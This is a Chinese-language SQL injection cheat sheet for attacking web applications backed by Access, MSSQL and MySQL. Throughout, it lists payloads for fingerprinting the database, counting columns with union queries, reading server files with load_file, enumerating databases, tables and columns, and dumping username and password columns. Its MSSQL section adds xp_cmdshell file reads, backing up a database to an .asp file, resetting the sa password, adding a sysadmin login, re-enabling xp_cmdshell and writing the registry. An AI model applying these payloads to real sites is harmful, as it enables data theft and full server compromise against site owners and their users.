判断数据库类型:                                                                              
Access:
 and (select id from MSysAccessObjects) >0 返回正常说明是access


MSSQL:
 and (select id from sysobjects) >0 返回正常说明是mssql


MySQL:
 and length(user())>0    返回正常说明是MySQL


mysql：

1.判断版本 and ord(mid(version(),1,1))>51 /* 返回正常说明是4.0以上版本，可以用union查询
2.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10
3.再利用union来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,......./*直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。
4.判断数据库连接帐号有没有写权限，and (select count(*) from mysql.user)>0 /*如果结果返回错误，那我们只能猜解管理员帐号和密码了。
5.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /* 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。

6、检测是不是root权限 and/**/ord(mid(user(),1,1))=114/*

7、mysql内置函数hex()转换字符为16进制，如select hex(user())
mysql内置函数unhex() 解码16进制，如select unhex(hex(user())) 

8、mysql内置函数concat()将多列合并成一列，如select concat(username,0x3A,password) from t_member

9常用内置函数使用：
select system_user()  查看系统用户

select current_user()  查询当前用户

select user()  查询用户

SELECT version()  查询数据库版本

SELECT database()  查询当前连接的数据库

select @@version_compile_os 查询当前操作系统

select @@datadir    查询读取数据库路径
select @@basedir    查询MYSQL安装路径

----------------------淫荡的分割线---------------------------------------------

去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量
第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。

10、查数据库数量
union select cuncat(schema_name,0x3A)  from information_schema.schemata limit 1,1


11、查询表
union select table_name from information_schema.tables where table_schema =库名 limit 1,1




MSSQL：

检测是否为SA权限
and 1=(select IS_SRVROLEMEMBER('sysadmin'));--

检测是否为DB权限
and 1=(Select IS_MEMBER('db_owner'))

爆所有数据库 union select name from master.dbo.sysdatabases where dbid=1  1代表第一个库

爆所有表
第一张表 union select  top 1 name from 库名.dbo.sysobjects where xtype='U'

第二张表 union select  top 1 name from 库名.dbo.sysobjects where xtype='U' and name not in('第一张表')

第三张表 union select  top 1 name from 库名.dbo.sysobjects where xtype='U' and name not in('第一张表','第二张表')
...


爆列：
爆ID  select id from seay.dbo.sysobjects where xtype='U' and name='admin'

爆第一个列 select top 1 name from seay.dbo.syscolumns where id=ID号

爆第二个列  select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in('第一个列')
...


爆数据：
select 列名 from 表名


exec master.dbo.xp_dirtree 'c:\';  遍历目录
exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器 
exec master.dbo.xp_subdirs 'c:\';-- 获得子目录列表 
exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树结构 
exec master.dbo.xp_cmdshell 'type c:\web\web.config';-- 查看文件的内容 

备份数据库：backup database 库名 to disk='c:/l.asp'; 


MSSQL内置函数：
select @@version  查询数据库版本

select user_name() 查询当前数据库连接用户名

select db_name()  查询当前数据库名


更改sa密码
exec sp_password NULL,'新密码','sa'


添加SA权限用户
exec sp_addlogin 'username','pass','master';
exec sp_addsrvrolemember 'username', sysadmin



检测是否支持多行
;declare @d int;--


停掉或激活某个服务。

exec master..xp_servicecontrol 'stop','schedule'
exec master..xp_servicecontrol 'start','schedule'


解开压缩档。

xp_unpackcab 'c:\test.cab','c:\temp',1



恢复 xp_cmdshell
;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--


开启沙盘模式：
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1



